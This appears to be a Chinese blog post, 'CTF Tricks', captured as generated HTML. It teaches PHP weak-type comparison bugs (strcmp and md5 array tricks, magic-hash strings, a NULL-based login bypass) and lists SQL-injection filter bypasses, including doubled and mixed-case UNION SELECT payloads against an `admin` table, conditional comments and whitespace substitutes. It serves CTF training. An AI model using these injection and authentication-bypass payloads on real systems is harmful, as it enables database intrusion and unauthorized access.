@@ -1,0 +1,977 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="J_drops" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0x01 php弱类型什么是php弱类型php变量类型12345678910stringintegerarraydoubleobjectresourceNULLstring array NULL  可以从RGPC传入遇到不符类型，自动转换
+php类型装换123456789&apos;&apos; == 0 == false&apos;123&apos; == 123&apos;abc&apos; == 0&apos;123a&apos; == 123&apos;0x01&apos; == 1&apos;0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF Tricks">
+<meta property="og:url" content="http://yoursite.com/2017/04/05/CTF-Tricks/index.html">
+<meta property="og:site_name" content="J_drops">
+<meta property="og:description" content="0x01 php弱类型什么是php弱类型php变量类型12345678910stringintegerarraydoubleobjectresourceNULLstring array NULL  可以从RGPC传入遇到不符类型，自动转换
+php类型装换123456789&apos;&apos; == 0 == false&apos;123&apos; == 123&apos;abc&apos; == 0&apos;123a&apos; == 123&apos;0x01&apos; == 1&apos;0">
+<meta property="og:image" content="http://i4.buimg.com/567571/ad87307d19e8920c.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/1b97150d0fd6d935.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/cb2f754cdbe6b79a.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/4b6433b7282b4e81.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/8ad57cf3994ffdea.png">
+<meta property="og:updated_time" content="2017-04-05T15:32:11.557Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF Tricks">
+<meta name="twitter:description" content="0x01 php弱类型什么是php弱类型php变量类型12345678910stringintegerarraydoubleobjectresourceNULLstring array NULL  可以从RGPC传入遇到不符类型，自动转换
+php类型装换123456789&apos;&apos; == 0 == false&apos;123&apos; == 123&apos;abc&apos; == 0&apos;123a&apos; == 123&apos;0x01&apos; == 1&apos;0">
+<meta name="twitter:image" content="http://i4.buimg.com/567571/ad87307d19e8920c.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/04/05/CTF-Tricks/"/>
+
+
+
+
+
+  <title> CTF Tricks | J_drops </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">J_drops</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生没有白走的路，每一步都算数</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/05/CTF-Tricks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jdrops">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://i4.buimg.com/567571/7a862ab5af458319.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="J_drops">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                CTF Tricks
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-05T13:03:32+08:00">
+                2017-04-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x01-php弱类型"><a href="#0x01-php弱类型" class="headerlink" title="0x01 php弱类型"></a>0x01 php弱类型</h3><h4 id="什么是php弱类型"><a href="#什么是php弱类型" class="headerlink" title="什么是php弱类型"></a>什么是php弱类型</h4><p>php变量类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">string</div><div class="line">integer</div><div class="line"><span class="keyword">array</span></div><div class="line">double</div><div class="line">object</div><div class="line">resource</div><div class="line"><span class="keyword">NULL</span></div><div class="line"></div><div class="line">string <span class="keyword">array</span> <span class="keyword">NULL</span>  可以从RGPC传入</div><div class="line">遇到不符类型，自动转换</div></pre></td></tr></table></figure></p>
+<p>php类型装换<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="string">''</span> == <span class="number">0</span> == <span class="keyword">false</span></div><div class="line"><span class="string">'123'</span> == <span class="number">123</span></div><div class="line"><span class="string">'abc'</span> == <span class="number">0</span></div><div class="line"><span class="string">'123a'</span> == <span class="number">123</span></div><div class="line"><span class="string">'0x01'</span> == <span class="number">1</span></div><div class="line"><span class="string">'0e123456789'</span> == <span class="string">'0e987654321'</span></div><div class="line">[<span class="keyword">false</span>] == [<span class="number">0</span>] == [<span class="keyword">NULL</span>] == [<span class="string">''</span>]</div><div class="line"><span class="keyword">NULL</span> == <span class="keyword">false</span> == <span class="number">0</span></div><div class="line"><span class="keyword">true</span> == <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<h4 id="题型1-scrcmp"><a href="#题型1-scrcmp" class="headerlink" title="题型1 scrcmp"></a>题型1 scrcmp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'flag'</span>],FLAG) == <span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div><div class="line"></div><div class="line">scrcmp:如果 str1 小于 str2 返回 &lt; <span class="number">0</span>； 如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；如果两者相等，返回 <span class="number">0</span></div><div class="line">strcmp比较出错=&gt;返回<span class="keyword">NULL</span>=&gt;<span class="keyword">NULL</span> == <span class="number">0</span> =&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://i4.buimg.com/567571/ad87307d19e8920c.png" alt=""></p>
+<h4 id="题型2-字符串比较（原值不相等，md5值相等）"><a href="#题型2-字符串比较（原值不相等，md5值相等）" class="headerlink" title="题型2 字符串比较（原值不相等，md5值相等）"></a>题型2 字符串比较（原值不相等，md5值相等）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'s1'</span>] != $_GET[<span class="string">'s2'</span>]</div><div class="line">	&amp;&amp; md5($_GET[<span class="string">'s1'</span>]) == md5($_GET[<span class="string">'s2'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://i2.muimg.com/567571/1b97150d0fd6d935.png" alt=""></p>
+<h5 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h5><blockquote>
+<p>什么是科学计数法</p>
+</blockquote>
+<p>‘0e123456789’ == ‘0e987654321’ == 0</p>
+<blockquote>
+<p>md5值的取值范围</p>
+</blockquote>
+<p>‘0123456789abcdef’</p>
+<blockquote>
+<p>[0e+数字]的md5</p>
+</blockquote>
+<p>md5(‘QNKCDZO’) ==<br>‘0e830400451993494058024219903391’</p>
+<p>md5(‘240610708’) ==<br>‘0e462097431906509019562988736854’</p>
+<h5 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h5><blockquote>
+<p>PHP md5函数特性</p>
+</blockquote>
+<p>md5([1,2,3]) == md5([4,5,6]) == NULL</p>
+<blockquote>
+<p>数组Trick,无需再利用弱类型比较特性<br><img src="http://i1.piimg.com/567571/cb2f754cdbe6b79a.png" alt=""><br>总结的一些常用的比较<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">php &gt; var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>),   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                    </div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e462097431906509019562988736854"</span></div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e830400451993494058024219903391"</span></div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> == <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> === <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ==   md5(<span class="string">'QNKCDZO'</span>));                                                                                       </div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) === md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">false</span>)</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="题型3-登录逻辑常见考点"><a href="#题型3-登录逻辑常见考点" class="headerlink" title="题型3 登录逻辑常见考点"></a>题型3 登录逻辑常见考点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$name = addcslashes($_POST[<span class="string">'name'</span>]);</div><div class="line">$r = $db-&gt;get_row(<span class="string">"SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'"</span>);</div><div class="line"><span class="keyword">if</span>($r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>]))&#123;</div><div class="line">	<span class="comment">//...login success</span></div><div class="line">&#125;</div><div class="line">不存在sql注入漏洞</div><div class="line">密码比较使用严格模式“===”，故此处不存在弱类型比较漏洞</div></pre></td></tr></table></figure>
+<p>运行流程:</p>
+<p><img src="http://i2.muimg.com/567571/4b6433b7282b4e81.png" alt=""></p>
+<blockquote>
+<p>NULL的巧妙构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户不存在=&gt;$r[<span class="string">'pass'</span>]&lt;=&gt;<span class="keyword">NULL</span></div><div class="line">密码是数组=&gt;md5($_POST[<span class="string">'pass'</span>]) ⇔ <span class="keyword">NULL</span></div><div class="line">$r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>])</div><div class="line"><span class="keyword">NULL</span> === <span class="keyword">NULL</span> 成立</div><div class="line">成功登录！</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="0x02-发现源码（题面信息越少，越可能需要找到源码）"><a href="#0x02-发现源码（题面信息越少，越可能需要找到源码）" class="headerlink" title="0x02 发现源码（题面信息越少，越可能需要找到源码）"></a>0x02 发现源码（题面信息越少，越可能需要找到源码）</h3><blockquote>
+<p>发现套路<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">题目只给出一个登录框</div><div class="line">页面只有一两行字</div><div class="line">页面中包含Powered XXX</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p>关于misc查看通讯地址Trick</p>
+<p>直接丢到 <a href="https://www.virustotal.com/" target="_blank" rel="external">https://www.virustotal.com/</a> 在 Behavioural information 可以看到通讯地址</p>
+<p>源码发掘考点一览<br><img src="http://i2.muimg.com/567571/8ad57cf3994ffdea.png" alt=""></p>
+<h3 id="0x03-CTF比赛中的那些WAF与绕过"><a href="#0x03-CTF比赛中的那些WAF与绕过" class="headerlink" title="0x03 CTF比赛中的那些WAF与绕过"></a>0x03 CTF比赛中的那些WAF与绕过</h3><h4 id="题型4-字符串替换WAF"><a href="#题型4-字符串替换WAF" class="headerlink" title="题型4 字符串替换WAF"></a>题型4 字符串替换WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"union"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"into"</span>, <span class="string">""</span>, $str);</div></pre></td></tr></table></figure>
+<p>一大堆非常严格的过滤，最后出现一处字符串替换空型WAF</p>
+<p>方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> uniunionon selselectect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> from `admin` limit <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<h4 id="题型5-字符替换空型WAF加强版"><a href="#题型5-字符替换空型WAF加强版" class="headerlink" title="题型5 字符替换空型WAF加强版"></a>题型5 字符替换空型WAF加强版</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$tmp_str = <span class="string">""</span>;</div><div class="line"><span class="keyword">while</span>($tmp_str != $str) &#123;</div><div class="line"> $tmp_str = $str;</div><div class="line"> $str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>通过循环替换转移注意力，实际简单的大小写变换即可绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> UniON SeLeCT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> FrOM `admin` LiMiT <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<h4 id="题型6-特殊字符-串-拦截型WAF"><a href="#题型6-特殊字符-串-拦截型WAF" class="headerlink" title="题型6 特殊字符(串)拦截型WAF"></a>题型6 特殊字符(串)拦截型WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(\bselect\b|\bunion\b|and|or|;|,|#|\(|\))/is'</span>,</div><div class="line">$_GET[<span class="string">'id'</span>])) &#123;</div><div class="line"> <span class="keyword">exit</span>(<span class="string">'BAD ID'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>####那些常见的SQL Trick<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[\bselect\b] 或 [\bunion\b]: </div><div class="line">    Mysql条件注释的利用 <span class="comment">/*!50000select*/</span></div><div class="line">    浮点数利用WHERE id=0.1UnIoN <span class="keyword">SeLeCT</span> ...</div><div class="line">[#]</div><div class="line">    Mysql注释符:<span class="comment">/**/</span>,<span class="comment">/*!条件注释*、,--,;,`</span></div><div class="line">[,]</div><div class="line">    盲注 mid(user() from 1 for 1) == mid(user(),1,1)</div><div class="line">    UNION注入 union select * from (select 1)a join (select 2)b ==union select 1,2</div><div class="line">[and] 或 [or]: </div><div class="line">    查缺补漏xor,||,&amp;&amp;.!,not</div><div class="line">[&gt;|=|&lt;] 逻辑操作符:</div><div class="line">    关键字替代符号 between、like、rlike、regex、is</div><div class="line">    与0比较法 -1 or 1=1 and ord(substr(user(),1,1))-114</div><div class="line">[空白符]</div><div class="line">    控制字符替代法20 09 0A 0B 0C 0D A0</div><div class="line">    符号替代法 /**/、select.<span class="string">``</span>.password、<span class="keyword">select</span>+<span class="keyword">user</span>()</div><div class="line">    括号组合法 <span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),<span class="number">2</span>)、<span class="keyword">select</span>&#123;x(<span class="keyword">password</span>)&#125;<span class="keyword">from</span>&#123;x(<span class="keyword">user</span>)&#125;</div></pre></td></tr></table></figure></p>
+<p><a href="https://regex101.com/" target="_blank" rel="external">不要害怕正则</a></p>
+<p>未完待续！！！！！！！！</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/SHARE/some-ctf-tricks-ppt.html" target="_blank" rel="external">CTF比赛总是输？你还差点Tricks!</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+    <div>
+      
+          
+<div style="text-align:center;color: #ccc;font-size:14px;">
+------*** end*** ------</div>
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/29/string标准库源码学习/" rel="next" title="string标准库源码学习">
+                <i class="fa fa-chevron-left"></i> string标准库源码学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/04/05/ZCTF线下赛php弱类型/" rel="prev" title="ZCTF线下赛php弱类型">
+                ZCTF线下赛php弱类型 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://i4.buimg.com/567571/7a862ab5af458319.jpg"
+               alt="Jdrops" />
+          <p class="site-author-name" itemprop="name">Jdrops</p>
+           
+              <p class="site-description motion-element" itemprop="description">天下事有难易乎？为之，则难者亦易矣；不为，则易者亦难矣。</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                    <span class="links-of-author-item" style="text-align:left">
+                       <a href="https://z.codes/" title="python大神" target="_blank">
+                           python大神
+                      </a>
+                    </span>
+                 
+                    <span class="links-of-author-item" style="text-align:left">
+                       <a href="http://blog.neargle.com/" title="斌师傅" target="_blank">
+                           斌师傅
+                      </a>
+                    </span>
+                 
+                    <span class="links-of-author-item" style="text-align:left">
+                       <a href="http://byd.dropsec.xyz/" title="毕师傅" target="_blank">
+                           毕师傅
+                      </a>
+                    </span>
+                 
+                    <span class="links-of-author-item" style="text-align:left">
+                       <a href="http://zjw.dropsec.xyz/" title="hello_c" target="_blank">
+                           hello_c
+                      </a>
+                    </span>
+                 
+                    <span class="links-of-author-item" style="text-align:left">
+                       <a href="http://zt.dropsec.xyz/" title="小光头" target="_blank">
+                           小光头
+                      </a>
+                    </span>
+                 
+                    <span class="links-of-author-item" style="text-align:left">
+                       <a href="http://lzx.dropsec.xyz/" title="George_Lee" target="_blank">
+                           George_Lee
+                      </a>
+                    </span>
+                 
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-php弱类型"><span class="nav-number">1.</span> <span class="nav-text">0x01 php弱类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是php弱类型"><span class="nav-number">1.1.</span> <span class="nav-text">什么是php弱类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题型1-scrcmp"><span class="nav-number">1.2.</span> <span class="nav-text">题型1 scrcmp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题型2-字符串比较（原值不相等，md5值相等）"><span class="nav-number">1.3.</span> <span class="nav-text">题型2 字符串比较（原值不相等，md5值相等）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Solution1"><span class="nav-number">1.3.1.</span> <span class="nav-text">Solution1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Solution2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Solution2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题型3-登录逻辑常见考点"><span class="nav-number">2.</span> <span class="nav-text">题型3 登录逻辑常见考点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-发现源码（题面信息越少，越可能需要找到源码）"><span class="nav-number">3.</span> <span class="nav-text">0x02 发现源码（题面信息越少，越可能需要找到源码）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-CTF比赛中的那些WAF与绕过"><span class="nav-number">4.</span> <span class="nav-text">0x03 CTF比赛中的那些WAF与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#题型4-字符串替换WAF"><span class="nav-number">4.1.</span> <span class="nav-text">题型4 字符串替换WAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题型5-字符替换空型WAF加强版"><span class="nav-number">4.2.</span> <span class="nav-text">题型5 字符替换空型WAF加强版</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题型6-特殊字符-串-拦截型WAF"><span class="nav-number">4.3.</span> <span class="nav-text">题型6 特殊字符(串)拦截型WAF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
